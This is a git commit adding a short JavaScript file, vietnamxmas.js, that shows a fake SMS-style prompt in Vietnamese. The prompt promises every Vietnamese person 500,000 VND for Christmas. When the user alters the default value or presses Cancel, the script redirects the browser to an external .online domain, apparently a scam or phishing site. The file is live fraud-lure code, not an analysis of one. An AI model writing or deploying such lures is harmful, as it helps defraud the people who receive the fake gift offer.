a138d9ff9d086527480ab02a07ebd0d4c7fecfdd
newetijazz11 <newetijazz11@gmail.com>
2025-12-23 12:45:51 +0100

    Create vietnamxmas.js

---
+++ vietnamxmas.js
@@ -0,0 +1,5 @@
+var password = 'Rút 500,000VND'
+password=prompt('SMS: Chúc mừng! Chúng tôi sẽ tặng 500.000 VND cho tất cả người Việt Nam để cùng nhau đón mừng Giáng sinh năm nay. Nhấp vào OK để nhận ưu đãi này.','Rút 500,000VND');
+if (password != 'Rút 500,000VND') {
+location.href='https://www.bhufrizx.online/Vietnamxmas-500000VND';
+}
